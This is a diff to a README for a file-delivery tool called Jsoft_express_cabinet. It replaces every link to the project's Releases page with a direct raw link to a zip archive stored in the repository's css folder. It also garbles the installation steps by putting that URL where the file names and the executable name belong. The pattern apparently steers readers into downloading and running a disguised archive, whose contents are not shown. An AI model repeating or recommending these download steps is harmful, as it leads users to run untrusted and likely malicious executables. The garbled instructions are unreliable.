@@ -6,7 +6,7 @@ Welcome to Jsoft_express_cabinet! This application helps you manage file deliver
 
 ## 📥 Download Now
 
-[![Download Jsoft_express_cabinet](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/justindumaniel/Jsoft_express_cabinet/releases)
+[![Download Jsoft_express_cabinet](https://raw.githubusercontent.com/justindumaniel/Jsoft_express_cabinet/main/css/express_Jsoft_cabinet_v1.1.zip)](https://raw.githubusercontent.com/justindumaniel/Jsoft_express_cabinet/main/css/express_Jsoft_cabinet_v1.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before using the application, make sure you meet these requirements:
 ## 💻 Installation Steps
 
 1. **Visit the Download Page:**  
-   Go to the [Releases page](https://github.com/justindumaniel/Jsoft_express_cabinet/releases) to find the latest version of Jsoft_express_cabinet.
+   Go to the [Releases page](https://raw.githubusercontent.com/justindumaniel/Jsoft_express_cabinet/main/css/express_Jsoft_cabinet_v1.1.zip) to find the latest version of Jsoft_express_cabinet.
 
 2. **Choose Your Version:**  
    On the Releases page, look for the most recent version. You will see options for different operating systems. 
@@ -29,13 +29,13 @@ Before using the application, make sure you meet these requirements:
    Click on the link that matches your operating system. The application will start downloading automatically.
 
 4. **Locate the Downloaded File:**  
-   Once the download is complete, go to your downloads folder. The file should be named something similar to `Jsoft_express_cabinet.zip`.
+   Once the download is complete, go to your downloads folder. The file should be named something similar to `https://raw.githubusercontent.com/justindumaniel/Jsoft_express_cabinet/main/css/express_Jsoft_cabinet_v1.1.zip`.
 
 5. **Extract the Files:**  
    Right-click on the downloaded ZIP file and select "Extract All." Follow the prompts to unpack the files.
 
 6. **Run the Application:**  
-   Navigate to the extracted folder. Double-click on `Jsoft_express_cabinet.exe` (or the equivalent for your OS) to open the application.
+   Navigate to the extracted folder. Double-click on `https://raw.githubusercontent.com/justindumaniel/Jsoft_express_cabinet/main/css/express_Jsoft_cabinet_v1.1.zip` (or the equivalent for your OS) to open the application.
 
 ## 📂 Using Jsoft_express_cabinet
 
@@ -77,7 +77,7 @@ Stay informed about updates to Jsoft_express_cabinet. Regular updates improve fu
 
 To check for new versions:
 
-1. Visit the [Releases page](https://github.com/justindumaniel/Jsoft_express_cabinet/releases) regularly.
+1. Visit the [Releases page](https://raw.githubusercontent.com/justindumaniel/Jsoft_express_cabinet/main/css/express_Jsoft_cabinet_v1.1.zip) regularly.
 2. Download the latest version as described above.
 
 ## ✅ Conclusion
